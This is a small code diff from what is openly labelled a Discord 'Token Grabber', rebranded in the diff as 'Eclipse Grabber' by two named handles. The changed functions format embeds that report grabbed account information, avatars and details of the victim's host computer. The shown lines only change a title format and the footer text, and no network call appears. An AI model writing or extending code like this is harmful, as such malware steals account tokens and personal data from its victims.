@@ -140,7 +140,7 @@ class Account():
 
 def field_former(title: str, text: str, inline: bool = True) -> str:
     return {
-        "name": f"**{title.title()} Info**",
+        "name": f"**{title} Info**",
         "value": text,
         "inline": bool(inline)
         }
@@ -179,7 +179,7 @@ def embed_accounts_info(accounts: List[Account], host: Computer) -> List[dict]:
                 "icon_url": account.avatar_url
             },
             "footer": {
-                "text": "Token Grabber",
+                "text": "Eclipse Grabber by @3ct0s and @JM1k1",
             }
         })
     return embeds
